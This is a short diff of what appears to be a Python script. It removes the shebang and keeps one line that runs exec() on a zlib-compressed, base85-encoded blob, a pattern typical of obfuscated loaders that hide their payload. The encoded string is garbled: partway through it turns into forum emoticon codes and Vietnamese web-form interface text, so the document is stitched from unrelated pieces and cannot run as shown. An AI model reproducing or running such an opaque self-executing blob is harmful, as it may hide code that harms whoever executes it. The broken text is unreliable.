@@ -1,2 +1,2 @@
-#!/bin/python3
+
 exec(__import__('zlib').decompress(__import__('base64').b85decode(b"c%01|U2ojR@!f#`!<YriJLkTX#BL+^63CA21paF5vkX`kh!t<|xH*1>yOea1^_=#hXav*^(88#Vpa}X<pg{u^upas#qyIzxC7s>n@kk!YJ3BFuwSXgMcV_2nXJ&_HUKm6IBKk#4x!`BdjH1AUAfyoyK?F=sGeNyE6@o@*&m<thJet1nDNmmRd^~$*NJkJx%oo-U@qHRKn(JrJ01o{MeJ~6IGUM!-{#zQ7omYSUUGn$j8{8~?&H#(B!e2F9v0px^=PR&k7bj%1oEP{!N*_|tpI$wA`s&GFUOo9*{>`!K;F|lwq?}Q&h*yN9Yra`w>L@P-E?p4xXwFcctyLh9RleG-^m!>T%18:37/-strong/-heart:>:o:-((:-hĐã gửiXem trước khi gửiThả Files vào đây để xem lại trước khi gửi"))
